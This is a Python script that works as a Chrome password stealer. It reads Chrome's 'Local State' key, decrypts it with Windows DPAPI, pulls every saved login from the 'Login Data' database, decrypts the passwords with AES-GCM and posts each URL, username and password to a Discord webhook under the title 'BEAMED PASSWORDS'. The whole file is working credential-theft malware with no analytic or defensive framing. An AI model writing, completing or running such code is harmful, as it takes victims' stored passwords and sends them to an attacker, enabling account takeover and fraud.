import os
import sqlite3
import win32crypt
import json
import base64
from Crypto.Cipher import AES
import requests

def decrypt_password(encrypted_password, key):
    try:
        encrypted_password = encrypted_password[3:]
        cipher = AES.new(key, AES.MODE_GCM, encrypted_password[:12])
        decrypted_password = cipher.decrypt(encrypted_password[12:-16]).decode('utf-8')
        return decrypted_password
    except Exception as e:
        print("Failed to decrypt password:", str(e))
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                  "AppData", "Local", "Google", "Chrome",
                                  "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)[5:]

    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def send_to_discord(embed_data):
    webhook_url  = "WEBHOOK"
    data = {
        "embeds": [embed_data]
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Password sent to webhook successfully.")
    else:
        print("Failed to send password to  webhook. Status code:", response.status_code)

def get_chrome_passwords():
    data_path = os.path.join(os.environ["USERPROFILE"],
                             "AppData", "Local", "Google", "Chrome",
                             "User Data", "Default", "Login Data")

    try:
        connection = sqlite3.connect(data_path)
        cursor = connection.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        login_data = cursor.fetchall()

        encryption_key = get_encryption_key()

        for url, username, encrypted_password in login_data:
            decrypted_password = decrypt_password(encrypted_password, encryption_key)

            embed_data = {
                "title": "BEAMED PASSWORDS",
                "color": 65280,
                "fields": [
                    {
                        "name": "URL",
                        "value": f"```{url}```",
                        "inline": False
                    },
                    {
                        "name": "Username",
                        "value": f"```{username}```",
                        "inline": False
                    },
                    {
                        "name": "Password",
                        "value": f"```{decrypted_password}```",
                        "inline": False
                    }
                ]
            }

            send_to_discord(embed_data)

    except Exception as e:
        print("Couldn't get the beamed passwords ):", str(e))
    finally:
        cursor.close()
        connection.close()

if __name__ == "__main__":
    get_chrome_passwords()
